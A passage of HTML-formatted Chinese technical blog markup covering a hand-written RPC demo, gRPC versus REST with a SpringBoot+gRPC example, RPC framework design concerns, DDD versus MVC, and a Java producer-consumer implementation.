class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"type\">Server</span> <span class=\"variable\">serviceServer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ServiceCenter</span>(<span class=\"number\">8088</span>);</span><br><span class=\"line\">                    serviceServer.register(ServiceProducer.class, ServiceProducerImpl.class);</span><br><span class=\"line\">                    serviceServer.start();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">        <span class=\"type\">ServiceProducer</span> <span class=\"variable\">service</span> <span class=\"operator\">=</span> RPCClient.getRemoteProxyObj(ServiceProducer.class, <span class=\"keyword\">new</span> <span class=\"title class_\">InetSocketAddress</span>(<span class=\"string\">&quot;localhost&quot;</span>, <span class=\"number\">8088</span>));</span><br><span class=\"line\">        System.out.println(service.sendData(<span class=\"string\">&quot;test&quot;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"gRPC\"><a href=\"#gRPC\" class=\"headerlink\" title=\"gRPC\"></a>gRPC</h2><h3 id=\"gRPC与REST\"><a href=\"#gRPC与REST\" class=\"headerlink\" title=\"gRPC与REST\"></a>gRPC与REST</h3><ul>\n<li>REST通常以业务为导向，将业务对象上执行的操作映射到HTTP动词，格式非常简单，可以使用浏览器进行扩展和传输，通过JSON数据完成客户端和服务端之间的消息通信，直接支持请求&#x2F;响应方式的通信。不需要中间的代理，简化了系统的架构，不同系统之间只需要对JSON进行解析和序列化即可完成数据的传递。</li>\n<li>但是REST也存在一些弊端，比如只支持请求&#x2F;响应这种单一的通信方式，对象和字符串之间的序列化操作也会影响消息传递速度，客户端需要通过服务发现的方式，知道服务实例的位置，在单个请求获取多个资源时存在着挑战，而且有时候很难将所有的动作都映射到HTTP动词。</li>\n<li>正是因为REST面临一些问题，因此可以采用gRPC作为一种替代方案，gRPC 是一种基于二进制流的消息协议，可以采用基于Protocol Buffer的IDL定义grpc API,这是Google公司用于序列化结构化数据提供的一套语言中立的序列化机制，客户端和服务端使用HTTP&#x2F;2以Protocol Buffer格式交换二进制消息。</li>\n<li>gRPC的优势是，设计复杂更新操作的API非常简单，具有高效紧凑的进程通信机制，在交换大量消息时效率高，远程过程调用和消息传递时可以采用双向的流式消息方式，同时客户端和服务端支持多种语言编写，互操作性强；不过gRPC的缺点是不方便与JavaScript集成，某些防火墙不支持该协议。</li>\n<li>注册中心：当项目中有很多服务时，可以把所有的服务在启动的时候注册到一个注册中心里面，用于维护服务和服务器之间的列表，当注册中心接收到客户端请求时，去找到该服务是否远程可以调用，如果可以调用需要提供服务地址返回给客户端，客户端根据返回的地址和端口，去调用远程服务端的方法，执行完成之后将结果返回给客户端。这样在服务端加新功能的时候，客户端不需要直接感知服务端的方法，服务端将更新之后的结果在注册中心注册即可，而且当修改了服务端某些方法的时候，或者服务降级服务多机部署想实现负载均衡的时候，我们只需要更新注册中心的服务群即可。<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/5.png\"></li>\n</ul>\n<h3 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>这里使用SpringBoot+gRPC的形式实现RPC调用过程 项目结构分为三部分：client、grpc、server</p>\n<h4 id=\"grpc\"><a href=\"#grpc\" class=\"headerlink\" title=\"grpc\"></a>grpc</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/6.png\"></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>io.grpc<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>grpc-all<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.12.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">extensions</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">extension</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>kr.motd.maven<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>os-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.4.1.Final<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">extension</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">extensions</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.xolstice.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>protobuf-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.5.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">pluginId</span>&gt;</span>grpc-java<span class=\"tag\">&lt;/<span class=\"name\">pluginId</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">protocArtifact</span>&gt;</span>com.google.protobuf:protoc:3.0.2:exe:$&#123;os.detected.classifier&#125;<span class=\"tag\">&lt;/<span class=\"name\">protocArtifact</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">pluginArtifact</span>&gt;</span>io.grpc:protoc-gen-grpc-java:1.2.0:exe:$&#123;os.detected.classifier&#125;<span class=\"tag\">&lt;/<span class=\"name\">pluginArtifact</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                            <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">                            <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>compile-custom<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></span><br><span class=\"line\">                        <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></span><br><span class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>创建.proto文件</p>\n<figure class=\"highlight protobuf\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax = <span class=\"string\">&quot;proto3&quot;</span>;   <span class=\"comment\">// 语法版本</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// stub选项</span></span><br><span class=\"line\"><span class=\"keyword\">option</span> java_package = <span class=\"string\">&quot;com.shgx.grpc.api&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">option</span> java_outer_classname = <span class=\"string\">&quot;RPCDateServiceApi&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">option</span> java_multiple_files = <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义包名</span></span><br><span class=\"line\"><span class=\"keyword\">package</span> com.shgx.grpc.api;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 服务接口定义，服务端和客户端都要遵守该接口进行通信</span></span><br><span class=\"line\"><span class=\"keyword\">service </span><span class=\"title class_\">RPCDateService</span> &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">rpc</span> getDate (RPCDateRequest) <span class=\"keyword\">returns</span> (RPCDateResponse) </span>&#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义消息（请求）</span></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">RPCDateRequest</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">string</span> userName = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 定义消息（响应）</span></span><br><span class=\"line\"><span class=\"keyword\">message </span><span class=\"title class_\">RPCDateResponse</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">string</span> serverDate = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>mvn complie</p>\n<p>生成代码：<br><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/7.png\"></p>\n<h4 id=\"client\"><a href=\"#client\" class=\"headerlink\" title=\"client\"></a>client</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/8.png\"></p>\n<p>根据gRPC中的项目配置在client和server两个Module的pom.xml添加依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.shgx<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>grpc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>0.0.1-SNAPSHOT<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>compile<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>编写GRPCClient</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GRPCClient</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">String</span> <span class=\"variable\">host</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;localhost&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">serverPort</span> <span class=\"operator\">=</span> <span class=\"number\">9999</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">( String[] args )</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ManagedChannel</span> <span class=\"variable\">managedChannel</span> <span class=\"operator\">=</span> ManagedChannelBuilder.forAddress( host, serverPort ).usePlaintext().build();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            RPCDateServiceGrpc.<span class=\"type\">RPCDateServiceBlockingStub</span> <span class=\"variable\">rpcDateService</span> <span class=\"operator\">=</span> RPCDateServiceGrpc.newBlockingStub( managedChannel );</span><br><span class=\"line\">            <span class=\"type\">RPCDateRequest</span> <span class=\"variable\">rpcDateRequest</span> <span class=\"operator\">=</span> RPCDateRequest</span><br><span class=\"line\">                    .newBuilder()</span><br><span class=\"line\">                    .setUserName(<span class=\"string\">&quot;shgx&quot;</span>)</span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">            <span class=\"type\">RPCDateResponse</span> <span class=\"variable\">rpcDateResponse</span> <span class=\"operator\">=</span> rpcDateService.getDate( rpcDateRequest );</span><br><span class=\"line\">            System.out.println( rpcDateResponse.getServerDate() );</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            managedChannel.shutdown();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h4><p><img src=\"/./2024/05/26/%E5%9C%BA%E6%99%AF%E8%AE%BE%E8%AE%A1%E9%9D%A2%E8%AF%95%E9%A2%98/9.png\"></p>\n<p>按照2.2.3 client的方式添加依赖</p>\n<p>创建RPCDateServiceImpl</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RPCDateServiceImpl</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">RPCDateServiceGrpc</span>.RPCDateServiceImplBase&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">getDate</span><span class=\"params\">(RPCDateRequest request, StreamObserver&lt;RPCDateResponse&gt; responseObserver)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">RPCDateResponse</span> <span class=\"variable\">rpcDateResponse</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        Date now=<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>();</span><br><span class=\"line\">        <span class=\"type\">SimpleDateFormat</span> <span class=\"variable\">simpleDateFormat</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;今天是&quot;</span>+<span class=\"string\">&quot;yyyy年MM月dd日 E kk点mm分&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">nowTime</span> <span class=\"operator\">=</span> simpleDateFormat.format( now );</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            rpcDateResponse = RPCDateResponse</span><br><span class=\"line\">                    .newBuilder()</span><br><span class=\"line\">                    .setServerDate( <span class=\"string\">&quot;Welcome &quot;</span> + request.getUserName()  + <span class=\"string\">&quot;, &quot;</span> + nowTime )</span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            responseObserver.onError(e);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            responseObserver.onNext( rpcDateResponse );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        responseObserver.onCompleted();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建GRPCServer</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">GRPCServer</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">port</span> <span class=\"operator\">=</span> <span class=\"number\">9999</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">( String[] args )</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Server</span> <span class=\"variable\">server</span> <span class=\"operator\">=</span> ServerBuilder.</span><br><span class=\"line\">                forPort(port)</span><br><span class=\"line\">                .addService( <span class=\"keyword\">new</span> <span class=\"title class_\">RPCDateServiceImpl</span>() )</span><br><span class=\"line\">                .build().start();</span><br><span class=\"line\">        System.out.println( <span class=\"string\">&quot;grpc服务端启动成功, 端口=&quot;</span> + port );</span><br><span class=\"line\">        server.awaitTermination();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"一个优秀的RPC框架需要考虑的问题\"><a href=\"#一个优秀的RPC框架需要考虑的问题\" class=\"headerlink\" title=\"一个优秀的RPC框架需要考虑的问题\"></a>一个优秀的RPC框架需要考虑的问题</h2><ol>\n<li><code>微服务化</code>应用都基于微服务化，实现资源调用离不开远程调用</li>\n<li><code>多实例问题</code> 一个服务可能有多个实例，你在调用时，要如何获取这些实例的地址呢？— 这时候就需要一个服务注册中心，从服务注册中心获取服务的实例列表，再从中选择一个进行调用。</li>\n<li><code>负载均衡</code> 选哪个调用好呢？这时候就需要负载均衡了，于是又得考虑如何实现复杂均衡</li>\n<li><code>缓存</code> 总不能每次调用时都去注册中心查询实例列表吧，这样效率多低呀，于是又有了缓存，有了缓存，就要考虑缓存的更新问题</li>\n<li><code>异步调用</code> 客户端总不能每次调用完都干等着服务端返回数据吧,于是就要支持异步调用;<ul>\n<li>Future实现</li>\n</ul>\n</li>\n<li><code>版本控制</code> 服务端的接口修改了，老的接口还有人在用，怎么办？总不能让他们都改了吧？这就需要版本控制了；</li>\n<li><code>线程池</code> 服务端总不能每次接到请求都马上启动一个线程去处理吧？于是就需要线程池；</li>\n<li><code>未处理完的请求</code> 服务端关闭时，还没处理完的请求怎么办？是直接结束呢，还是等全部请求处理完再关闭呢？</li>\n</ol>\n<h2 id=\"什么是DDD？\"><a href=\"#什么是DDD？\" class=\"headerlink\" title=\"什么是DDD？\"></a>什么是DDD？</h2><h3 id=\"MVC\"><a href=\"#MVC\" class=\"headerlink\" title=\"MVC\"></a>MVC</h3><p>要说DDD，不得不先看看MVC，我相信基本上99%的java开发读者，不管你是计科专业出身还是跨专业，初学spring或者springboot的时候，接触到的代码分层都是MVC<br>这说明了MVC有它自身独有的优势：</p>\n<ul>\n<li>开发人员可以只关注整个结构中的其中某一层；</li>\n<li>可以很容易的用新的实现来替换原有层次的实现；</li>\n<li>可以降低层与层之间的依赖；</li>\n<li>有利于标准化；</li>\n<li>利于各层逻辑的复用。</li>\n</ul>\n<p>但是真实情况是这样吗？随着你系统功能迭代，业务逻辑越来越复杂之后。MVC三层中，V层作为数据载体，C层作为逻辑路由都是很薄的一层，大量的代码都堆积在了M层（模型层）。一个service的类，动辄几百上千行，大的甚至几万行，逻辑嵌套复杂，主业务逻辑不清晰。service做的稍微轻量化一点的，代码就像是胶水，把数据库执行逻辑与控制返回给前端的逻辑胶在一起，主次不清晰。<br>一看你的工程，类啊，代码量啊都不少，你甚至不知道如何入手去修改“屎山”一样的代码。</p>\n<h3 id=\"那么DDD为什么可以去解决以上的问题呢？\"><a href=\"#那么DDD为什么可以去解决以上的问题呢？\" class=\"headerlink\" title=\"那么DDD为什么可以去解决以上的问题呢？\"></a>那么DDD为什么可以去解决以上的问题呢？</h3><p>DDD核心思想是什么呢？解耦！让业务不是像炒大锅饭一样混在一起，而是一道道工序复杂的美食，都有他们自己独立的做法。</p>\n<p>DDD的价值观里面，任何业务都是某个业务领域模型的职责体现。A领域只会去做A领域的事情，A领域想去修改B领域，需要找中介（防腐层）去对B领域完成操作。我想完成一个很长的业务逻辑动作，在划分好业务边界之后，交给业务服务的编排者（应用服务）去组织业务模型（聚合）完成逻辑。</p>\n<p>这样，每个服务（领域）只会做自己业务边界内的事情，最小细粒度的去定义需求的实现。原先空空的贫血模型摇身一变变成了充血模型。原理冗长的service里面类似到处set，get值这种与业务逻辑无关的数据载体包装代码，都会被去除，进到应用服务层，你的代码就是你的业务逻辑。逻辑清晰，可维护性高！</p>\n<h3 id=\"什么样的系统适配DDD\"><a href=\"#什么样的系统适配DDD\" class=\"headerlink\" title=\"什么样的系统适配DDD\"></a>什么样的系统适配DDD</h3><p>中小规模的系统，本身业务体量小，功能单一，选择mvc架构无疑是最好的。 项目化交付的系统，研发周期短，一天到晚按照甲方的需求定制功能。</p>\n<p>中大规模系统，产品化模式，业务可持续迭代，可预见的业务逻辑复杂性的系统。</p>\n<h3 id=\"DDD的代码怎么做\"><a href=\"#DDD的代码怎么做\" class=\"headerlink\" title=\"DDD的代码怎么做\"></a>DDD的代码怎么做</h3><p>&#x2F;&#x2F; TODO</p>\n<h2 id=\"Java实现生产者消费者\"><a href=\"#Java实现生产者消费者\" class=\"headerlink\" title=\"Java实现生产者消费者\"></a>Java实现生产者消费者</h2><h3 id=\"wait-和notify-方法的实现\"><a href=\"#wait-和notify-方法的实现\" class=\"headerlink\" title=\"wait()和notify()方法的实现\"></a>wait()和notify()方法的实现</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test1</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">Integer</span> <span class=\"variable\">count</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Integer</span> <span class=\"variable\">FULL</span> <span class=\"operator\">=</span> <span class=\"number\">10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">String</span> <span class=\"variable\">LOCK</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;lock&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">Test1</span> <span class=\"variable\">test1</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Test1</span>();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Producer</span>()).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(test1.<span class=\"keyword\">new</span> <span class=\"title class_\">Consumer</span>()).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Producer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (LOCK) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == FULL) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            LOCK.wait();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                            e.printStackTrace();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count++;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName() + <span class=\"string\">&quot;生产者生产，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    LOCK.notifyAll();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Consumer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Thread.sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (LOCK) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (count == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                            LOCK.wait();</span><br><span class=\"line\">                        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    count--;</span><br><span class=\"line\">                    System.out.println(Thread.currentThread().getName() + <span class=\"string\">&quot;消费者消费，目前总共有&quot;</span> + count);</span><br><span class=\"line\">                    LOCK.notifyAll();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"可重入锁ReentrantLock的实现\"><a href=\"#可重入锁ReentrantLock的实现\" class=\"headerlink\" title=\"可重入锁ReentrantLock的实现\"></a>可重入锁ReentrantLock的实现</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Test2</span> &#123;</span><br><span 